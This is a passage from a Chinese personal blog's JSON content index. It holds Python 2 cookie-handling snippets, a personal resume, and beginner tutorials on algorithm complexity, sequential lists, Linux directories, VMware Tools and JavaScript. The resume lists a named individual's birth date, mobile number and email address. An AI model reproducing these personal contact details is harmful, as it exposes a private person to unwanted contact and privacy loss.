\"\"for item in cookie:cookies = cookies + item.name + \"=\" + item.value + \";\"# 舍去最后⼀位的分号print cookies[:-1] 我们使⽤以上⽅法将 cookie 保存到变量中，然后打印出了 cookie 中的值，运⾏结果如下： 123BAIDUID=4327A58E63A92B73FF7A297FB3B2B4D0:FG=1;BIDUPSID=4327A58E63A92B73FF7A297FB3B2B4D0;H_PS_PSSID=1429_21115_17001_21454_21409_21554_21398;PSTM=1480815736;BDSVRTM=0;BD_HOME=0 2) 访问⽹站获得 cookie，并把获得的 cookie 保存在 cookie⽂件中 123456789101112131415# urllib2_cookielibtest2.pyimport cookielibimport urllib2# 设置保存 cookie 的⽂件，同级⽬录下的 cookie.txtfilename = 'cookie.txt'# 声明⼀个 LWPCookieJar(有 save 实现)对象实例来保存 cookie，之后写⼊⽂件cookie = cookielib.LWPCookieJar(filename)# 利⽤urllib2 库的 HTTPCookieProcessor 对象来创建 cookie 处理器handler = urllib2.HTTPCookieProcessor(cookie)# 通过 handler 来构建 openeropener = urllib2.build_opener(handler)# 创建⼀个请求，原理同 urllib2 的 urlopenresponse = opener.open(\"http://www.baidu.com\")# 保存 cookie 到⽂件，且忽略 cookie 失效限制cookie.save(ignore_discard=True, ignore_expires=True) 3) 从⽂件中获取 cookies 并访问 12345678910111213# urllib2_cookielibtest2.pyimport cookielibimport urllib2# 创建 LWPCookieJar(有 load 实现)实例对象cookie = cookielib.LWPCookieJar()# 从⽂件中读取 cookie 内容到变量，忽略 cookie 的使⽤时效cookie.load('cookie.txt', ignore_discard=True, ignore_expires=True)# 创建请求的 requestreq = urllib2.Request(\"http://www.baidu.com\")# 利⽤urllib2 的 build_opener⽅法创建⼀个 openeropener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cookie))response = opener.open(req)print response.read()","categories":[{"name":"网络爬虫","slug":"网络爬虫","permalink":"https://xiaowuyoucy.github.io/categories/网络爬虫/"}],"tags":[{"name":"urlib2","slug":"urlib2","permalink":"https://xiaowuyoucy.github.io/tags/urlib2/"}]},{"title":"Resume of David Wei","slug":"201609270452","date":"2016-09-26T20:55:00.000Z","updated":"2019-09-27T01:25:18.900Z","comments":true,"path":"2016/09/27/201609270452/","link":"","permalink":"https://xiaowuyoucy.github.io/2016/09/27/201609270452/","excerpt":"","text":"姓名：温剑威 出生年月日：19960206 性别：男 现居住地：广州市天河区 电话：13926259736 mail:jww1996@foxmail.com IT技能专长： 熟练使用python进行后端开发 熟练使用Django ：ORM，Form，Template，Tags，Middleware自定制等技术 熟练使用PHP，ThinkPHP ，HTML，CSS，JavaScript，JQuery，Ajax，Bootstrap等页面开发技术 熟练Socket网络编程，多线程，多进程，协程，异步IO多路复用如select/poll/epoll 的原理及使用 熟练使用装饰器，迭代器，生成器及单例模式的使用 熟练操作MySQL，基础的增删改查语句，会使用关联查询等较复杂语句，对存储过程，事物操做有一定的了解 熟悉requests模块及爬虫框架Scrapy进行网页爬取，解析，并了解其原理 熟悉Numpy、Pandas、Matplotlib、Seaborn数据分析库 熟悉Tensorflow、Caffe等人工智能开发框架 熟悉机器学习常用算法（线性回归、逻辑回归、贝叶斯、决策树、SVM、降维、聚类、EM等）及代码实现 了解深度学习算法RNN,LSTM,GAN,DCGAN,DQN,CNN等 了解常见的算法与数据结构 如（冒泡排序，堆排序，快速排序）等 ​ 社会活动与项目经历： 2018.03-2019.03 Python： -Python讲师 ​ 2018.03-2018.05 Python机器学习书籍撰写 ： -撰写书籍 ​ 2017.08-2018.02 项目名称：CRM客户关系管理系统 : -项目描述：实现企业客户数据管理，实现市场营销、销售、服务等活动自动化，并建立一个客户信息的收集、管理、分析、利用的系统。 -项目功能：1. 可视化界面对各种数据进行手动录入操作；2. 运营数据的增、删、改、查； -开发要点：1. 参考Django Admin、ModelForm自定义后台操作组件及数据库表操作；2. 基于角色进行权限控制；3. 自定义分页功能 2017.02-2017.07 项目名称：公交管理系统 ： -项目描述：实现公交企业内部运营管理的自动化，实现运营部门，车队，调度各方面职责的权限细化，解决手动记录派班、车次和考勤的不便利性，便于通过数据进行计划、分析和执行。 -项目功能：1. 可视化界面对各种数据进行手动录入操作；2. 运营数据的增、删、改、查； -项目描述：实现公交企业内部运营管理的自动化，实现运营部门，车队，调度各方面职责的权限细化，解决手动记录派班、车次和考勤的不便利性，便于通过数据进行计划、分析和执行。 2016.07-2016.12 情感分析 : -运用自然语言处理、文本挖掘及计算机语言学等方法来识别和提取藏文语料素材中的主观信息 2016.01-2017.02 网络安全： -主要负责网络安全 -代码审计漏洞挖掘，渗透测试评估以及漏洞修复方案 -给广大客户的站点，提供WEB漏洞修复方案 2015.08-2016.01 前端开发（实习）： -负责前端开发，协作后端工程师完成网站，前后端对接以及用户体验的构想并实现 工作简历: -2016.01-2017.07 广州拓宏网络科技有限公司 -2016.01-2017.07 嘉峪科技有限公司 -2017.11-2018.06 水木为名教育科技有限公司 -2018.06-2019.03 老男孩教育科技有限公司（深圳分公司） IT、汉语水平、英语技能: -2012.05 CCT全国高等学校计算机考试（二级） -2015.01 Web开发（熟练掌握） -2016.04 普通话水平测试（二级甲等） -2017.06 CET-4（428分） 兴趣爱好： -人工智能:（两年AI经验，目前研究自动程序计 ） -英语：（坚持背单词，平均每天20个） -电影：类型（动作，奇幻，喜剧，恐怖，冒险，爱情，警匪，科幻，温情，史诗） -音乐：类型（经典，流行，嘻哈，英语，粤语，日语） -健身：（大学坚持健身三年半） -理财（买过基金，现在主要关注互联网金融，投资P2P） -读书（心理学、经济类、历史类、科技类、人文类、金融类、政治类等） 自我评价： -乐于分享，帮助他人。善于团结他人，乐于奉献。 -自学能力强，逻辑清晰严谨，沟通表达能力强。 -有团队意识，以大局为重。可以为了集体利益牺牲个人利益。 -做事认真，有责任心。领导交办的事都会保质保量按时完成。 -总体来说是一个忠于自己价值观及自己所重视的人的理想主义者。","categories":[{"name":"关于博主","slug":"关于博主","permalink":"https://xiaowuyoucy.github.io/categories/关于博主/"}],"tags":[{"name":"简历","slug":"简历","permalink":"https://xiaowuyoucy.github.io/tags/简历/"}]},{"title":"数据结构与算法","slug":"201607092036","date":"2016-07-09T12:36:18.000Z","updated":"2019-04-09T19:05:16.770Z","comments":true,"path":"2016/07/09/201607092036/","link":"","permalink":"https://xiaowuyoucy.github.io/2016/07/09/201607092036/","excerpt":"","text":"算法的概念 算法是计算机处理信息的本质，因为计算机程序本质上是一个算法来告诉计算机确切的步骤来执行一个指定的任务。一般地，当算法在处理信息时，会从输入设备或数据的存储地址读取数据，把结果写入输出设备或某个存储地址供以后再调用。 算法是独立存在的一种解决问题的方法和思想。 对于算法而言，实现的语言并不重要，重要的是思想。 算法可以有不同的语言描述实现版本（如C描述、C++描述、Python描述等），我们现在是在用Python语言进行描述实现。 算法的五大特性 输入: 算法具有0个或多个输入 输出: 算法至少有1个或多个输出 有穷性: 算法在有限的步骤之后会自动结束而不会无限循环，并且每一个步骤可以在可接受的时间内完成 确定性：算法中的每一步都有确定的含义，不会出现二义性 可行性：算法的每一步都是可行的，也就是说每一步都能够执行有限的次数完成 引入案例 如果 a+b+c=1000，且 a2a^{2}a2+b2b^{2}b2=c2c^{2}c2（a,b,c 为自然数），如何求出所有a、b、c可能的组合? 题解: 1234567891011121314import timestart_time = time.time()# 注意是三重循环for a in range(0, 1001): for b in range(0, 1001): for c in range(0, 1001): if a**2 + b**2 == c**2 and a+b+c == 1000: print(\"a, b, c: %d, %d, %d\" % (a, b, c))end_time = time.time()print(\"elapsed: %f\" % (end_time - start_time))print(\"complete!\") 运行结果： 123456a, b, c: 0, 500, 500a, b, c: 200, 375, 425a, b, c: 375, 200, 425a, b, c: 500, 0, 500elapsed: 214.583347complete! 注意运行的时间:214.583347秒 显然是一个失败的算法，将近用了4分钟，我们先明确一下这道题的一些要求和规律，当中的 A,B,C 其当中的一个数和另外的两个数是有关系的，当我们知道 A,B的时候 C的结果其实已经被确定了，我们可以把结果抽象成算式 C = 1000 - B - A 优化代码： 1234567891011121314import timestart_time = time.time()# 注意是两重循环for a in range(0, 1001): for b in range(0, 1001-a): c = 1000 - a - b if a**2 + b**2 == c**2: print(\"a, b, c: %d, %d, %d\" % (a, b, c))end_time = time.time()print(\"elapsed: %f\" % (end_time - start_time))print(\"complete!\") 注意运行的时间:0.182897秒 计算效率均衡 执行时间反应算法效率 对于同一问题，我们给出了两种解决算法，在两种算法的实现中，我们对程序执行的时间进行了测算，发现两段程序执行的时间相差悬殊（214.583347秒相比于0.182897秒），由此我们可以得出结论：实现算法程序的执行时间可以反应出算法的效率，即算法的优劣。 单靠时间值绝对可信吗？ 假设我们将第二次尝试的算法程序运行在一台配置古老性能低下的计算机中，情况会如何？很可能运行的时间并不会比在我们的电脑中运行算法一的214.583347秒快多少。 单纯依靠运行的时间来比较算法的优劣并不一定是客观准确的！ 程序的运行离不开计算机环境（包括硬件和操作系统），这些客观原因会影响程序运行的速度并反应在程序的执行时间上。那么如何才能客观的评判一个算法的优劣呢？ 时间复杂度与“大O记法 我们假定计算机执行算法每一个基本操作的时间是固定的一个时间单位，那么有多少个基本操作就代表会花费多少时间单位。算然对于不同的机器环境而言，确切的单位时间是不同的，但是对于算法进行多少个基本操作（即花费多少时间单位）在规模数量级上却是相同的，由此可以忽略机器环境的影响而客观的反应算法的时间效率。 对于算法的时间效率，我们可以用“大O记法”来表示。 “大O记法”：对于单调的整数函数f，如果存在一个整数函数g和实常数c&gt;0，使得对于充分大的n总有f(n)&lt;=c*g(n)，就说函数g是f的一个渐近函数（忽略常数），记为f(n)=O(g(n))。也就是说，在趋向无穷的极限意义下，函数f的增长速度受到函数g的约束，亦即函数f与函数g的特征相似。 时间复杂度：假设存在函数g，使得算法A处理规模为n的问题示例所用时间为T(n)=O(g(n))，则称O(g(n))为算法A的渐近时间复杂度，简称时间复杂度，记为T(n) 如何理解“大O记法” 对于算法进行特别具体的细致分析虽然很好，但在实践中的实际价值有限。对于算法的时间性质和空间性质，最重要的是其数量级和趋势，这些是分析算法效率的主要部分。而计量算法基本操作数量的规模函数中那些常量因子可以忽略不计。例如，可以认为 3n23n{^2}3n2 和 100n2100n{^2}100n2属于同一个量级，如果两个算法处理同样规模实例的代价分别为这两个函数，就认为它们的效率“差不多”，都为 n2n^{2}n2级 最坏时间复杂度 分析算法时，存在几种可能的考虑： 算法完成工作最少需要多少基本操作，即最优时间复杂度 算法完成工作最多需要多少基本操作，即最坏时间复杂度 算法完成工作平均需要多少基本操作，即平均时间复杂度 对于最优时间复杂度，其价值不大，因为它没有提供什么有用信息，其反映的只是最乐观最理想的情况，没有参考价值。 对于最坏时间复杂度，提供了一种保证，表明算法在此种程度的基本操作中一定能完成工作。 对于平均时间复杂度，是对算法的一个全面评价，因此它完整全面的反映了这个算法的性质。但另一方面，这种衡量并没有保证，不是每个计算都能在这个基本操作内完成。而且，对于平均情况的计算，也会因为应用算法的实例分布可能并不均匀而难以计算。 因此，我们主要关注算法的最坏情况，亦即最坏时间复杂度。 时间复杂度的几条基本计算规则 基本操作，即只有常数项，认为其时间复杂度为O(1) 顺序结构，时间复杂度按加法进行计算 循环结构，时间复杂度按乘法进行计算 分支结构，时间复杂度取最大值 判断一个算法的效率时，往往只需要关注操作数量的最高次项，其它次要项和常数项可以忽略 在没有特殊说明时，我们所分析的算法的时间复杂度都是指最坏时间复杂度 算法分析 第一次尝试的算法核心部分 12345for a in range(0, 1001): for b in range(0, 1001): for c in range(0, 1001): if a**2 + b**2 == c**2 and a+b+c == 1000: print(\"a, b, c: %d, %d, %d\" % (a, b, c)) 时间复杂度： T(n) = O(n * n *n) = O(n3) ​ 2.第二次尝试的算法核心部分 12345for a in range(0, 1001): for b in range(0, 1001-a): c = 1000 - a - b if a**2 + b**2 == c**2: print(\"a, b, c: %d, %d, %d\" % (a, b, c)) 时间复杂度： T(n) = O(n * n * (1+1)) = O(n*n) = O(n2) 由此可见，我们尝试的第二种算法要比第一种算法的时间复杂度好多的。 常见时间复杂度 注意，经常将log2n（以2为底的对数）简写成logn 所消耗的时间从小到大 O(1) &lt; O(logn) &lt; O(n) &lt; O(nlogn) &lt; O(n2n^{2}n2) &lt; O((n3n^{3}n3) &lt; O((2n2^{n}2n) &lt; O(n!) &lt; O(nn) 练习： 时间复杂度练习( 参考算法的效率规则判断 ) O(5) O(2n + 1) O(n²+ n + 1) O(3n³+1)","categories":[{"name":"数据结构与算法","slug":"数据结构与算法","permalink":"https://xiaowuyoucy.github.io/categories/数据结构与算法/"}],"tags":[{"name":"算法","slug":"算法","permalink":"https://xiaowuyoucy.github.io/tags/算法/"}]},{"title":"数据结构顺序表的形式","slug":"201604101526","date":"2016-04-19T07:26:18.000Z","updated":"2019-04-10T07:52:28.962Z","comments":true,"path":"2016/04/19/201604101526/","link":"","permalink":"https://xiaowuyoucy.github.io/2016/04/19/201604101526/","excerpt":"","text":"顺序表 在程序中，经常需要将一组（通常是同为某个类型的）数据元素作为整体管理和使用，需要创建这种元素组，用变量记录它们，传进传出函数等。一组数据中包含的元素个数可能发生变化（可以增加或删除元素）。对于这种需求，最简单的解决方案便是将这样一组元素看成一个序列，用元素在序列里的位置和顺序，表示实际应用中的某种有意义的信息，或者表示数据之间的某种关系。这样的一组序列元素的组织形式，我们可以将其抽象为线性表。一个线性表是某类元素的一个集合，还记录着元素之间的一种顺序关系。线性表是最基本的数据结构之一，在实际程序中应用非常广泛，它还经常被用作更复杂的数据结构的实现基础。根据线性表的实际存储方式， 分为两种实现模型： 顺序表，将元素顺序地存放在一块连续的存储区里，元素间的顺序关系由它们的存储顺序自然表示。 链表，将元素存放在通过链接构造起来的一系列存储块中。 顺序表的基本形式 图a表示的是顺序表的基本形式，数据元素本身连续存储，每个元素所占的存储单元大小固定相同，元素的下标是其逻辑地址，而元素存储的物理地址（实际内存地址）可以通过存储区的起始地址Loc (e0)加上逻辑地址（第i个元素）与存储单元大小（c）的乘积计算而得，即： Loc(ei) = Loc(e0) + c*i 故，访问指定元素时无需从头遍历，通过计算便可获得对应地址，其时间复杂度为O(1)。 如果元素的大小不统一，则须采用图b的元素外置的形式，将实际数据元素另行存储，而顺序表中各单元位置保存对应元素的地址信息（即链接）。由于每个链接所需的存储量相同，通过上述公式，可以计算出元素链接的存储位置，而后顺着链接找到实际存储的数据元素。注意，图b中的c不再是数据元素的大小，而是存储一个链接地址所需的存储量，这个量通常很小。 图b这样的顺序表也被称为对实际数据的索引，这是最简单的索引结构。 顺序表的结构与实现 一个顺序表的完整信息包括两部分，一部分是表中的元素集合，另一部分是为实现正确操作而需记录的信息，即有关表的整体情况的信息，这部分信息主要包括元素存储区的容量和当前表中已有的元素个数两项。 顺序表的两种基本实现方式 图a为一体式结构，存储表信息的单元与元素存储区以连续的方式安排在一块存储区里，两部分数据的整体形成一个完整的顺序表对象;一体式结构整体性强，易于管理。但是由于数据元素存储区域是表对象的一部分，顺序表创建后，元素存储区就固定了;图b为分离式结构，表对象里只保存与整个表有关的信息（即容量和元素个数），实际数据元素存放在另一个独立的元素存储区里，通过链接与基本表对象关联。 元素存储区替换 一体式结构由于顺序表信息区与数据区连续存储在一起，所以若想更换数据区，则只能整体搬迁，即整个顺序表对象（指存储顺序表的结构信息的区域）改变了。 分离式结构若想更换数据区，只需将表信息区中的数据区链接地址更新即可，而该顺序表对象不变。 元素存储区扩充 采用分离式结构的顺序表，若将数据区更换为存储空间更大的区域，则可以在不改变表对象的前提下对其数据存储区进行了扩充，所有使用这个表的地方都不必修改。只要程序的运行环境（计算机系统）还有空闲存储，这种表结构就不会因为满了而导致操作无法进行。人们把采用这种技术实现的顺序表称为动态顺序表，因为其容量可以在使用中动态变化。 扩充的两种策略 每次扩充增加固定数目的存储位置，如每次扩充增加10个元素位置，这种策略可称为线性增长。 特点：节省空间，但是扩充操作频繁，操作次数多。 每次扩充容量加倍，如每次扩充增加一倍存储空间。 特点：减少了扩充操作的执行次数，但可能会浪费空间资源。以空间换时间，推荐的方式。 顺序表的操作 增加元素 如图所示，为顺序表增加新元素111的三种方式 a. 尾端加入元素，时间复杂度为O(1) b. 非保序的加入元素（不常见），时间复杂度为O(1) c. 保序的元素加入，时间复杂度为O(n) 删除元素 Python中的顺序表 Python中的list和tuple两种类型采用了顺序表的实现技术，具有前面讨论的顺序表的所有性质。 tuple是不可变类型，即不变的顺序表，因此不支持改变其内部状态的任何操作，而其他方面，则与list的性质类似。 list的基本实现技术 Python标准类型list就是一种元素个数可变的线性表，可以加入和删除元素，并在各种操作中维持已有元素的顺序（即保序），而且还具有以下行为特征： 基于下标（位置）的高效元素访问和更新，时间复杂度应该是O(1)； 为满足该特征，应该采用顺序表技术，表中元素保存在一块连续的存储区中。 允许任意加入元素，而且在不断加入元素的过程中，表对象的标识（函数id得到的值）不变。 为满足该特征，就必须能更换元素存储区，并且为保证更换存储区时list对象的标识id不变，只能采用分离式实现技术。 在Python的官方实现中，list就是一种采用分离式技术实现的动态顺序表。这就是为什么用list.append(x) （或 list.insert(len(list), x)，即尾部插入）比在指定位置插入元素效率高的原因。 在Python的官方实现中，list实现采用了如下的策略：在建立空表（或者很小的表）时，系统分配一块能容纳8个元素的存储区；在执行插入操作（insert或append）时，如果元素存储区满就换一块4倍大的存储区。但如果此时的表已经很大（目前的阀值为50000），则改变策略，采用加一倍的方法。引入这种改变策略的方式，是为了避免出现过多空闲的存储位置。","categories":[{"name":"数据结构与算法","slug":"数据结构与算法","permalink":"https://xiaowuyoucy.github.io/categories/数据结构与算法/"}],"tags":[{"name":"顺序表","slug":"顺序表","permalink":"https://xiaowuyoucy.github.io/tags/顺序表/"}]},{"title":"Linux目录结构","slug":"201604150110","date":"2016-04-14T17:11:18.000Z","updated":"2019-04-14T18:02:10.469Z","comments":true,"path":"2016/04/15/201604150110/","link":"","permalink":"https://xiaowuyoucy.github.io/2016/04/15/201604150110/","excerpt":"","text":"linux 的文件系统是采用层级式的树状目录结构，在此结构中的最上一层是根目录“/” 然后在此目录下再创建其他的目录。 深刻理解Linux树状文件目录是非常重要的，linux有一句非常经典的话叫做:在linux世界里，一切皆文件。 以下是对这些目录的解释： /bin： bin是Binary的缩写, 这个目录存放着最经常使用的命令。 /boot： 这里存放的是启动Linux时使用的一些核心文件，包括一些连接文件以及镜像文件。 /dev ： dev是Device(设备)的缩写, 该目录下存放的是Linux的外部设备，在Linux中访问设备的方式和访问文件的方式是相同的。 /dev ： dev是Device(设备)的缩写, 该目录下存放的是Linux的外部设备，在Linux中访问设备的方式和访问文件的方式是相同的。 /etc： 这个目录用来存放所有的系统管理所需要的配置文件和子目录。 /home： 用户的主目录，在Linux中，每个用户都有一个自己的目录，一般该目录名是以用户的账号命名的。 /lib： 这个目录里存放着系统最基本的动态连接共享库，其作用类似于Windows里的DLL文件。几乎所有的应用程序都需要用到这些共享库。 /lost+found： 这个目录一般情况下是空的，当系统非法关机后，这里就存放了一些文件。 /media： linux系统会自动识别一些设备，例如U盘、光驱等等，当识别后，linux会把识别的设备挂载到这个目录下。 /mnt： 系统提供该目录是为了让用户临时挂载别的文件系统的，我们可以将光驱挂载在/mnt/上，然后进入该目录就可以查看光驱里的内容了。 /opt： 这是给主机额外安装软件所摆放的目录。比如你安装一个ORACLE数据库则就可以放到这个目录下。默认是空的。 /proc： 这个目录是一个虚拟的目录，它是系统内存的映射，我们可以通过直接访问这个目录来获取系统信息。 这个目录的内容不在硬盘上而是在内存里，我们也可以直接修改里面的某些文件，比如可以通过下面的命令来屏蔽主机的ping命令，使别人无法ping你的机器： 1echo 1 &gt; /proc/sys/net/ipv4/icmp_echo_ignore_all /root： 该目录为系统管理员，也称作超级权限者的用户主目录。 /sbin： s就是Super User的意思，这里存放的是系统管理员使用的系统管理程序。 /selinux： 这个目录是Redhat/CentOS所特有的目录，Selinux是一个安全机制，类似于windows的防火墙，但是这套机制比较复杂，这个目录就是存放selinux相关的文件的。 /srv： 该目录存放一些服务启动之后需要提取的数据。 这是linux2.6内核的一个很大的变化。该目录下安装了2.6内核中新出现的一个文件系统 sysfs 。 sysfs文件系统集成了下面3种文件系统的信息：针对进程信息的proc文件系统、针对设备的devfs文件系统以及针对伪终端的devpts文件系统，该文件系统是内核设备树的一个直观反映。当一个内核对象被创建的时候，对应的文件和目录也在内核对象子系统中被创建。 /tmp： 这个目录是用来存放一些临时文件的。 /usr： 这是一个非常重要的目录，用户的很多应用程序和文件都放在这个目录下，类似于windows下的program files目录。 /usr/bin： 系统用户使用的应用程序。 /usr/sbin： 超级用户使用的比较高级的管理程序和系统守护程序。 /usr/src： 内核源代码默认的放置目录。 /var： 这个目录中存放着在不断扩充着的东西，我们习惯将那些经常被修改的目录放在这个目录下。包括各种日志文件。 /run： 是一个临时文件系统，存储系统启动以来的信息。当系统重启时，这个目录下的文件应该被删掉或清除。如果你的系统上有 /var/run 目录，应该让它指向 run。 在 Linux 系统中，有几个目录是比较重要的，平时需要注意不要误删除或者随意更改内部文件。 /etc： 上边也提到了，这个是系统中的配置文件，如果你更改了该目录下的某个文件可能会导致系统不能启动。 /bin, /sbin, /usr/bin, /usr/sbin: 这是系统预设的执行文件的放置目录，比如 ls 就是在/bin/ls 目录下的。 值得提出的是，/bin, /usr/bin 是给系统用户使用的指令（除root外的通用户），而/sbin, /usr/sbin 则是给root使用的指令。 /var： 这是一个非常重要的目录，系统上跑了很多程序，那么每个程序都会有相应的日志产生，而这些日志就被记录到这个目录下，具体在/var/log 目录下，另外mail的预设放置也是在这里。","categories":[{"name":"linux","slug":"linux","permalink":"https://xiaowuyoucy.github.io/categories/linux/"}],"tags":[{"name":"linux目录结构","slug":"linux目录结构","permalink":"https://xiaowuyoucy.github.io/tags/linux目录结构/"}]},{"title":"LinuxVmtools的安装和使用","slug":"201904140250","date":"2016-03-30T18:13:18.000Z","updated":"2019-04-14T18:22:43.622Z","comments":true,"path":"2016/03/31/201904140250/","link":"","permalink":"https://xiaowuyoucy.github.io/2016/03/31/201904140250/","excerpt":"","text":"安装步骤： 1.点击虚拟机，找到安装VMware Tools 之后点击 如下图： 之后就会出现VMware Tools的 文件，里面有个比较重要的包 tar.gz 如下图： 我们把这个包放到 系统文件OPT目录中，执行命令 tar -zxvf VMwareTools-10.0.0.5-53228253.tar.gz 解压安装 如下图： 解压完毕之后 我们会看到这个压缩包的文件夹 如下图： 之后我们CD到 这个文件夹，执行一个叫 vmware-install.pl 的文件 如下图： 之后我们需要reboot 重启Centos ，即可生效了。","categories":[{"name":"linux","slug":"linux","permalink":"https://xiaowuyoucy.github.io/categories/linux/"}],"tags":[{"name":"linux","slug":"linux","permalink":"https://xiaowuyoucy.github.io/tags/linux/"},{"name":"vmtools","slug":"vmtools","permalink":"https://xiaowuyoucy.github.io/tags/vmtools/"}]},{"title":"js-this方法","slug":"201504091559","date":"2015-04-09T07:59:18.000Z","updated":"2019-04-09T08:00:20.819Z","comments":true,"path":"2015/04/09/201504091559/","link":"","permalink":"https://xiaowuyoucy.github.io/2015/04/09/201504091559/","excerpt":"","text":"1234567891011121314151617181920212223242526272829303132333435363738394041&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;Document&lt;/title&gt; &lt;script&gt; // this出现在以下位置，分别代表什么 // 1 函数中 -- this 指向Window // 2 在方法中 -- this 指向的是这个方法所属的对象 // 3 构造函数中 -- this 就是构造函数创建的对象 // 函数 // function fn() &#123; // console.log(this); // &#125; // fn(); // 对象 // var obj = &#123; // name: 'zs', // fn: function () &#123; // console.log(this.name); // &#125; // &#125;; // obj.fn(); // 构造函数 function Fn() &#123; this.name = 'zs'; this.age = 18; console.log(this); &#125; // var o = new Fn(); // 调用构造函数 Fn(); // 函数调用 &lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;/body&gt;&lt;/html&gt;","categories":[{"name":"编程开发","slug":"编程开发","permalink":"https://xiaowuyoucy.github.io/categories/编程开发/"}],"tags":[{"name":"js-this方法","slug":"js-this方法","permalink":"https://xiaowuyoucy.github.io/tags/js-this方法/"}]},{"title":"javascript函数","slug":"201504072316","date":"2015-04-07T15:16:20.000Z","updated":"2019-04-07T17:25:25.508Z","comments":true,"path":"2015/04/07/201504072316/","link":"","permalink":"https://xiaowuyoucy.github.io/2015/04/07/201504072316/","excerpt":"","text":"什么是函数 把一段相对独立的具有特定功能的代码块封装起来，形成一个独立实体，就是函数，起个名字（函数名，在后续开发中可以反复调用,函数的作用就是封装一段代码，将来可以重复使用。 函数的定义 函数声明 123function 函数名() &#123; // 函数体&#125; 函数表达式 123var fn = function () &#123; // 函数体&#125; 特定：函数声明的时候，函数体并不会执行，只要当函数被调用的时候才会执行。 函数一般都用来干一件事情，函数名称一般使用动词。 调用函数的语法 函数名(); 特点：函数体只有在调用的时候才会执行，调用需要()进行调用。可以调用多次(重复使用) 代码示例： 1234567891011121314151617// 声明函数function sayHi() &#123; console.log(\"吃了没？\");&#125;// 调用函数sayHi();// 求1-100之间所有数的和function getSum() &#123; var sum = 0; for (var i = 0; i &lt; 100; i++) &#123; sum += i; &#125; console.log(sum);&#125;// 调用getSum(); 函数的参数 为什么要有参数 12345678910function getSum() &#123; var sum = 0; for (var i = 1; i &lt;= 100; i++) &#123; sum += i; &#125; console.log();&#125;// 虽然上面代码可以重复调用，但是只能计算1-100之间的值// 如果想要计算n-m之间所有数的和，应该怎么办呢？ 语法 12345678910// 函数内部是一个封闭的环境，可以通过参数的方式，把外部的值传递给函数内部// 带参数的函数声明function 函数名(形参1, 形参2, 形参3...) &#123; // 函数体&#125;// 带参数的函数调用函数名(实参1, 实参2, 实参3); 形参1 = 实参1形参2 = 实参2 形参和实参 形式参数：在声明一个函数的时候，为了函数的功能更加灵活，有些值是固定不了的，对于这些固定不了的值。我们可以给函数设置参数。这个参数没有具体的值，仅仅起到一个占位置的作用，我们通常称之为形式参数，也叫形参。 实际参数：如果函数在声明时，设置了形参，那么在函数调用的时候就需要传入对应的参数，我们把传入的参数叫做实际参数，也叫实参。 123456var x = 5, y = 6;fn(x,y); function fn(a, b) &#123; console.log(a + b);&#125;// x,y实参，有具体的值。函数执行的时候会把x,y复制一份给函数内部的a和b，函数内部的值是复制的新值，无法修改外部的x,y 函数返回值 当函数执行完的时候，并不是所有时候都要把结果打印。我们期望函数给我一些反馈（比如计算的结果返回进行后续的运算），这个时候可以让函数返回一些东西。也就是返回值。函数通过return返回一个返回值 返回值语法： 12345678//声明一个带返回值的函数function 函数名(形参1, 形参2, 形参3...) &#123; //函数体 return 返回值;&#125;//可以通过变量来接收这个返回值var 变量 = 函数名(实参1, 实参2, 实参3...);","categories":[{"name":"编程开发","slug":"编程开发","permalink":"https://xiaowuyoucy.github.io/categories/编程开发/"}],"tags":[{"name":"javascript函数","slug":"javascript函数","permalink":"https://xiaowuyoucy.github.io/tags/javascript函数/"}]},{"title":"js布尔类型的隐私转换","slug":"201804051318","date":"2015-04-04T20:13:18.000Z","updated":"2019-04-08T03:27:01.009Z","comments":true,"path":"2015/04/05/201804051318/","link":"","permalink":"https://xiaowuyoucy.github.io/2015/04/05/201804051318/","excerpt":"","text":"123456789101112131415161718192021222324252627282930313233&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;Document&lt;/title&gt; &lt;script&gt; // var num = 0; // console.log(Boolean(num)); // 转换成false的情况 0 ''空字符串 NaN null undefined // 隐式类型转换 // if (num) &#123; // console.log('hello'); // &#125; // // // var msg; // if (msg) &#123; // console.log('hello'); // &#125; // // var str = '123'; var isOK = !!str; // Boolean(str); console.log(isOK); &lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;/body&gt;&lt;/html&gt;","categories":[{"name":"编程开发","slug":"编程开发","permalink":"https://xiaowuyoucy.github.io/categories/编程开发/"}],"tags":[{"name":"js布尔类型隐私转换","slug":"js布尔类型隐私转换","permalink":"https://xiaowuyoucy.github.io/tags/js布尔类型隐私转换/"}]},{"title":"while和dowhile循环","slug":"201504051853","date":"2015-04-04T20:13:18.000Z","updated":"2019-04-05T11:35:51.671Z","comments":true,"path":"2015/04/05/201504051853/","link":"","permalink":"https://xiaowuyoucy.github.io/2015/04/05/201504051853/","excerpt":"","text":"while与 do while 的区别： while：先判断再执行。 do…while：先执行再判断。（无论如何会执行一次循环体里面的代码，二while循环有可能一次都不会执行） 12345678910111213141516171819202122232425262728293031323334353637383940&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;Document&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;script&gt; // 案例一：小盒子身上有100元，用while输出能吃多少次米线，一碗米线12元，最终还剩下多少钱。 var money = 100; while(money &gt;= 12)&#123; money -=12; console.log('我吃了一碗米线,还剩'+money+'元') &#125; //案例二：小盒子身上没钱了，吃了个霸王餐，用do...while实现。 do&#123; var money = 5; console.log(\"小盒子正在吃米线\"); money-=12 &#125;while(money&gt;=12) console.log(\"小盒子身上没钱了，吃了个霸王餐\");// 使用do-while循环：输出询问“我爱你，嫁给我吧？”，选择“你喜欢我吗？(y/n):\"，如果输入为y则打印”我们形影不离“，若输入为n,则继续询问 do &#123; var msg = prompt('你到底爱不爱我？', '请输入yes/no'); &#125; while (msg !== 'yes'); console.log('亲亲我的宝贝'); &lt;/script&gt; &lt;/body&gt; 